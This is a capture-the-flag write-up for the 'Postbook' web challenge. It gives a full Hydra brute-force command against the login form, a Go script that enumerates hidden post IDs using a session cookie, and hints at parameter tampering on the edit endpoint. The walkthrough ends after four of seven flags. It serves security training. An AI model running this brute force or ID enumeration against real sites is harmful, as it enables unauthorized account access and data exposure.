---
date: "2019-05-27"
title: "Postbook"
category: "CTF"
---

CTF time !!
Let's find flags.
![alt text](https://media.giphy.com/media/sSmxfWnEVxtWU/giphy.gif)


### Hidden Page ~ 🚩(1/7)
Log in to the app using a newly created account, we can see home page like
![alt text](https://storage.googleapis.com/warrenlee/myBlog/CTF/Postbook/home.jpg)

Clicking two posts below, we can see their URLs
1. http://35.190.155.168/7d9c59055d/index.php?page=view.php&id=3
2. http://35.190.155.168/7d9c59055d/index.php?page=view.php&id=1

Hmm...where is page with id equal to 2 ?
<br />
Then we got the first flag from the hidden page.

### Brute Force Attack Login Form ~ 🚩(2/7)
Let's use <a href="https://github.com/vanhauser-thc/thc-hydra" target="__blank">Hydra</a> to crack password for account "user".

First, by providing random password to username='user', we got the response page
![alt text](https://storage.googleapis.com/warrenlee/myBlog/CTF/Postbook/failed_to_log_in.jpg)

Then, we can use the command as follow to do brute force attack
```
hydra -V -l user -P passlist.txt 35.190.155.168 http-form-post "/7d9c59055d/index.php?page=sign_in.php:username=^USER^&password=^PASS^&submit=Submit:Nothing is logged"
.
-V verbose mode
-l specify username here
-P given password list file path
```

Before running this command, we need to get a password list file (ex: <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" target="__blank">File Link</a>)
<br />
Noted that, 'Submit:Nothing is logged' tells Hydra the error message in the response HTML.
![alt text](https://storage.googleapis.com/warrenlee/myBlog/CTF/Postbook/hydra_resp.jpg)

Bingo !! We got the password for 'user' is 'password'. 
<br />
Log in with this credential then we can get the flag.

### Mining Hidden Post ID ~ 🚩(3/7)
This flag was hidden in a post page with very large ID.
<br />
So we need to write a simple program to find the flag.
<br />
Below is a simple go program
```go
package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

const URL string = "http://34.74.105.127/2e79c1ae35/index.php?page=view.php&id=%d"
const COOKIE string = "id=c81e728d9d4c2f636f067f89cc14862c"
const CONTENT_LENGTH int = 1414

func makeRange(min, max int) []int {
	a := make([]int, max-min+1)
	for i := range a {
		a[i] = min + i
	}
	return a
}

func makeRequest(url string, ch chan<- string) {
	client := &http.Client{}

	// Declare HTTP Method and Url
	req, err := http.NewRequest("GET", url, nil)

	// Set cookie
	req.Header.Set("Cookie", COOKIE)
	resp, err := client.Do(req)
	defer resp.Body.Close()
	// Read response
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	if len(data) > CONTENT_LENGTH {
		ch <- string(data)
	} else {
		ch <- fmt.Sprintf("Not Found at url = %s", url)
	}

}

func main() {
	ids := makeRange(500, 1000)
	ch := make(chan string)
	for _, id := range ids {
		url := fmt.Sprintf(URL, id)
		go makeRequest(url, ch)
	}
	for range ids {
		output := <-ch
		if !strings.Contains(output, "Not Found") {
			fmt.Println(output)
		}
	}
}
```

In this case, once the client visit post with id = <b>945</b>, the flag will show up

### Mess Up Bad Design API, Part I ~ 🚩(4/7)
Now let's try to edit a post by clicking 'edit' and then 'save' buttons.
<br />
We can see a post request was sent from the client side with the URL below.
<b>http://34.74.105.127/2e79c1ae35/index.php?page=edit.php&id=3</b>
<br />
Interestingly, some unnecessary params were attached on the URL (id).
<br />
What if we resend the POST request without specifying id ?

### Mess Up Bad Design API, Part II ~ 🚩(5/7)
Coming Soon...